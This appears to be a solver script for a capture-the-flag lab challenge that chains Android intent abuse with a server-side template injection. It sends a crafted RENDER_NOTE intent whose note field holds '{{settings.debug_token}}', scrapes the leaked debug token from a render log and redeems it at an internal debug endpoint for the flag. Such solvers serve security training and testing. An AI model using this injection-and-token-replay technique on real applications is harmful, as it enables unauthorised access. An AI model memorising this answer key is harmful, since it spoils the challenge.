"""Intended-path solver: enumerate, craft the intent, lift the token, redeem it."""

import re

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

TOKEN_RE = re.compile(r"\[NotesRender/webview\] ([0-9a-f]{24})")


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    expected = ctx.expected_flags["chain-the-intent-leak"]
    client = httpx.Client(base_url=ctx.url(), timeout=10)

    stack = client.get("/api/activities").json()
    by_name = {a["name"]: a for a in stack["activities"]}
    assert by_name[".InternalDebugActivity"]["exported"] is False
    assert by_name[".NotesRenderActivity"]["actions"] == ["com.pantryview.action.RENDER_NOTE"]

    denial = client.post("/api/intent", json={"component": ".InternalDebugActivity"})
    assert denial.status_code == 403 and "SecurityException" in denial.text

    wrong_action = client.post(
        "/api/intent",
        json={"action": "android.intent.action.VIEW", "component": ".NotesRenderActivity"},
    )
    assert wrong_action.status_code == 404

    crafted = client.post(
        "/api/intent",
        json={
            "action": "com.pantryview.action.RENDER_NOTE",
            "component": ".NotesRenderActivity",
            "extras": {"note": "{{settings.debug_token}}", "render_mode": "webview"},
        },
    )
    assert crafted.status_code == 200 and crafted.json()["queued_render"] is True

    log = client.get("/api/render-log").json()["lines"]
    match = TOKEN_RE.search("\n".join(log))
    assert match, f"no leaked token in renderer output: {log}"
    token = match.group(1)

    resp = client.get("/internal/debug", params={"token": token})
    client.close()
    flags = find_flags(resp.text)
    captured = flags[0] if flags else None
    ok = captured == expected
    detail = None if ok else f"token={token} status={resp.status_code}"
    return SolveResult(
        results=[
            TaskResult(task_id="chain-the-intent-leak", ok=ok, captured=captured, detail=detail)
        ]
    )
